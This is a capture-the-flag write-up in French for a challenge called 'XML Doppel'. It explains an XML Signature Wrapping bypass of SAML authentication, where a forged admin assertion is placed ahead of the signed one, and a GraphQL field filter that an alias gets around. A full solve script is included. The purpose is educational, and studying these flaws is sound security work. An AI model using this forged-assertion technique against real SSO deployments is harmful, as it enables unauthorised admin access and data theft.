# XML Doppel — Writeup

## Énoncé (HTL)

- **Titre :** XML Doppel
- **Catégorie :** webex
- **Connexion :** `http://web.ctf.yogosha.com:8003`

> FleetDesk is an SSO-gated support console. Your identity provider posts a signed
> SAML response to the console's assertion consumer endpoint, and the console opens
> a session from the subject it carries. The fleet data lives behind a GraphQL API.
> You hold one legitimately signed low-privilege SAML response and the IdP's public
> certificate, both in the source drop and served from `/params`. A privileged
> GraphQL field returns an internal secret the UI never asks for and ordinary
> sessions cannot read. Reach that field and recover the flag.

## Protections / modèle

- `/params` sert la **réponse SAML basse-privilège signée** (valide) et le certificat
  public de l'IdP. On ne possède **pas** la clé privée : impossible de re-signer.
- `/saml/acs` vérifie la signature puis ouvre une session depuis l'identité extraite.
  - `role = "admin"` si `nameid in {"svc-admin"}`, sinon le rôle de l'attribut.
- `/graphql` : le champ `fleetSecret` ne renvoie le flag que si `role == "admin"`,
  et une fonction `authorize()` est censée interdire ce champ au public.

Deux verrous, donc : obtenir une session **admin**, puis atteindre **`fleetSecret`**.

## Vulnérabilité 1 : XML Signature Wrapping (deux parsers)

Le fichier `saml_verify.py` **vérifie** et **extrait l'identité** avec deux
bibliothèques XML différentes, qui ne voient pas le même document :

- `verify_signature()` utilise `xml.etree.ElementTree`. Il résout la `Reference URI`
  (`#_a7f3...`) vers l'élément **portant cet `ID`**, enlève sa `Signature`, recalcule
  le digest et compare. L'assertion signée d'origine est intacte → **la signature
  passe**.

```python
# saml_verify.py — on valide l'élément désigné par l'ID, pas "l'assertion courante"
for element in root.iter():
    if element.get("ID") == ref_id:
        target = element
        break
```

- `extract_identity()` utilise `lxml` et prend **le premier `NameID` du document** :

```python
# saml_verify.py
name_id = root.find(f".//{{{SAML}}}NameID")   # le PREMIER NameID rencontré
role = root.xpath("string(.//*[local-name()='Attribute'][@Name='role']/...)")
```

En **injectant une assertion forgée AVANT** l'assertion signée, la signature est
toujours validée sur l'assertion légitime (par son `ID`), mais l'identité lue est
celle de **notre** assertion : `NameID = svc-admin` → le serveur nous donne
`role = admin`.

## Vulnérabilité 2 : filtre GraphQL contournable par alias

`schema.py` interdit le champ `fleetSecret`… mais en se basant sur la **clé de
réponse** (l'alias s'il existe, sinon le nom) :

```python
# schema.py
key = selection.alias.value if selection.alias else selection.name.value
keys.add(key)
...
restricted = response_keys & RESTRICTED_FIELDS      # {"fleetSecret"}
```

Un **alias** change la clé : `{ leak: fleetSecret }` a pour clé `leak`, qui n'est
pas dans `RESTRICTED_FIELDS`. Le filtre ne voit rien, mais le resolver renvoie bien
le secret (on est admin).

## Résolution pas à pas

1. Récupérer la réponse SAML signée et le certificat depuis `/params` :

```python
import json, base64, urllib.request
params = json.loads(urllib.request.urlopen(base + "/params").read())
legit  = base64.b64decode(params["sample_response"]).decode()
```

2. Forger une assertion `svc-admin` / `role=admin` (non signée) :

```python
forged = (
    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    'ID="_forged" Version="2.0" IssueInstant="2026-10-11T09:00:00Z">'
    '<saml:Issuer>https://idp.fleetdesk.test</saml:Issuer>'
    '<saml:Subject><saml:NameID '
    'Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">svc-admin</saml:NameID></saml:Subject>'
    '<saml:Conditions NotBefore="2026-10-11T08:55:00Z" NotOnOrAfter="2027-10-11T09:05:00Z"/>'
    '<saml:AttributeStatement><saml:Attribute Name="role">'
    '<saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>'
    '</saml:Assertion>'
)
```

3. L'insérer **juste avant** l'assertion signée (wrapping) :

```python
marker = '<saml:Assertion xmlns:saml='
evil   = legit.replace(marker, forged + marker, 1)   # notre assertion passe en 1er
```

4. Poster vers `/saml/acs` (garder le cookie de session) :

```python
# -> {"nameid": "svc-admin", "role": "admin"}
```

5. Interroger `/graphql` avec l'alias et lire le flag :

```python
# {"query": "{ leak: fleetSecret }"}  ->  {"data": {"leak": "HTL{...}"}}
```

## Script complet -> Script intégral

```python
#!/usr/bin/env python3
# Usage: python3 solve.py <host> <port>
#        python3 solve.py web.ctf.yogosha.com 8003
# Dépendances : aucune (urllib / cookiejar de la stdlib)
import sys, base64, json, urllib.request, urllib.parse, http.cookiejar

host = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
port = sys.argv[2] if len(sys.argv) > 2 else "8003"
base = f"http://{host}:{port}"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(path, data=None, form=None):
    if form is not None:
        body, hdr = urllib.parse.urlencode(form).encode(), \
                    {"Content-Type": "application/x-www-form-urlencoded"}
    else:
        body, hdr = json.dumps(data).encode(), {"Content-Type": "application/json"}
    return opener.open(urllib.request.Request(base + path, body, hdr)).read().decode()

# 1. Réponse SAML signée (valide) + certificat, servis par /params
params = json.loads(opener.open(base + "/params").read())
legit  = base64.b64decode(params["sample_response"]).decode()

# 2. XML Signature Wrapping : on injecte une assertion forgée AVANT la signée.
#    - verify_signature() valide l'assertion LÉGITIME via son ID (signature OK) ;
#    - extract_identity() lit le PREMIER NameID -> le nôtre (svc-admin => admin).
forged = (
    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    'ID="_forged" Version="2.0" IssueInstant="2026-10-11T09:00:00Z">'
    '<saml:Issuer>https://idp.fleetdesk.test</saml:Issuer>'
    '<saml:Subject><saml:NameID '
    'Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">svc-admin</saml:NameID></saml:Subject>'
    '<saml:Conditions NotBefore="2026-10-11T08:55:00Z" NotOnOrAfter="2027-10-11T09:05:00Z"/>'
    '<saml:AttributeStatement><saml:Attribute Name="role">'
    '<saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>'
    '</saml:Assertion>'
)
marker = '<saml:Assertion xmlns:saml='
evil   = legit.replace(marker, forged + marker, 1)

# 3. L'ACS ouvre une session admin à partir de l'identité forgée.
acs = post("/saml/acs",
           form={"SAMLResponse": base64.b64encode(evil.encode()).decode()})
print("[*] /saml/acs ->", acs)

# 4. GraphQL : le filtre bloque la clé "fleetSecret" ; un ALIAS change la clé
#    (-> "leak") et contourne le contrôle. Le resolver renvoie le flag (role=admin).
gql = post("/graphql", data={"query": "{ leak: fleetSecret }"})
print("[*] /graphql ->", gql)

flag = (json.loads(gql).get("data") or {}).get("leak")
print("[+] Flag :", flag)
```

## Flag

```
HTL{two_parsers_one_signature}
```

*(Testé en local avec l'appli fournie — flag de dev `HTL{dev_default_xmldoppel}` —
puis sur l'instance HTL qui renvoie le flag ci-dessus. La vérification de signature
du wrapping a aussi été validée avec `exploit/test_verify.py` :*
`verify_signature: PASS` *et* `extract_identity: {'nameid': 'svc-admin', 'role': 'admin'}`*.)*
